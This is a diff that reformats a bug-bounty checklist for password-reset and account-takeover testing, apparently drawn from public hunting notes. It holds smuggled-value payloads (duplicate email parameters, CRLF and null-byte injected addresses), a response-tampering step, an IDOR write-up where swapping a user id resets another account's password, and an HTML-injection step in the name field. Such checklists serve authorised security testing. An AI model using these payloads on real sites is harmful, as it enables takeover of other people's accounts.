@@ -35,17 +35,17 @@ email=victim
 email=victim@xyz
 #change param case 
 email=victim@mail.com&Email=attacker@mail.com
-email@email.com**,**victim@hack.secry  
-email@email**“,”**victim@hack.secry  
-email@email.com**:**victim@hack.secry  
-email@email.com**%0d%0a**victim@hack.secry  
-**%0d%0a**victim@hack.secry  
-**%0a**victim@hack.secry  
-victim@hack.secry**%0d%0a**  
-victim@hack.secry**%0a**  
-victim@hack.secry**%0d**  
-victim@hack.secry**%00**  
-victim@hack.secry**{{}}**
+email@email.com,victim@hack.secry  
+email@email“,”victim@hack.secry  
+email@email.com:victim@hack.secry  
+email@email.com%0d%0avictim@hack.secry  
+%0d%0avictim@hack.secry  
+%0avictim@hack.secry  
+victim@hack.secry%0d%0a  
+victim@hack.secry%0a  
+victim@hack.secry%0d  
+victim@hack.secry%00  
+victim@hack.secry{{}}
 ```
 
 ```python
@@ -70,19 +70,20 @@ and forward the request.
     4. Intercept the response
     5. delete error message and change the status code to 200 and change body like what you noted in step1
     ```
-*   [ ] IDOR to ATO
+* [ ] IDOR to ATO
 
-    **IDOR on Reset Password**
+**IDOR on Reset Password**
 
-    The last one was also an Basic IDOR, When I requested for reset password then the request response looks like this
+The last one was also an Basic IDOR, When I requested for reset password then the request response looks like this
 
-    ![https://miro.medium.com/v2/1\*7GQ1sbFDEllEY1kpQodGoA.jpeg](https://miro.medium.com/v2/1*7GQ1sbFDEllEY1kpQodGoA.jpeg)
+![https://miro.medium.com/v2/1\*7GQ1sbFDEllEY1kpQodGoA.jpeg](https://miro.medium.com/v2/1*7GQ1sbFDEllEY1kpQodGoA.jpeg)
 
-    Then OTP came to my email and I entered the OTP but when I entered new password and captured that request
+Then OTP came to my email and I entered the OTP but when I entered new password and captured that request
 
-    ![https://miro.medium.com/v2/1\*Vk7-7Tdd\_bFmWAul2\_BsSQ.jpeg](https://miro.medium.com/v2/1*Vk7-7Tdd_bFmWAul2_BsSQ.jpeg)
+![https://miro.medium.com/v2/1\*Vk7-7Tdd\_bFmWAul2\_BsSQ.jpeg](https://miro.medium.com/v2/1*Vk7-7Tdd_bFmWAul2_BsSQ.jpeg)
 
-    Then I noticed there was no OTP field, but there was a user id, which was encrypted but was being leaked in the response, so I just replaced it with the user id of another account, and bam, my other account’s password was changed.
+Then I noticed there was no OTP field, but there was a user id, which was encrypted but was being leaked in the response, so I just replaced it with the user id of another account, and bam, my other account’s password was changed.
+
 *   [ ] Race Condition
 
     [Lab: Exploiting time-sensitive vulnerabilities | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)
@@ -121,8 +122,6 @@ and forward the request.
 *   [ ] [**HTML\_Injection\_on\_password\_reset\_page**](https://github.com/KathanP19/HowToHunt/blob/master/HTML_Injection/HTML_Injection_on_password_reset_page.md)
 
     ```
-    ### Steps
-
     1. Create your account
     2. Edit your name to `<h1>attacker</h1>` or `"abc><h1>attacker</h1>` and save it.
     3. Request for a reset password and check your email.
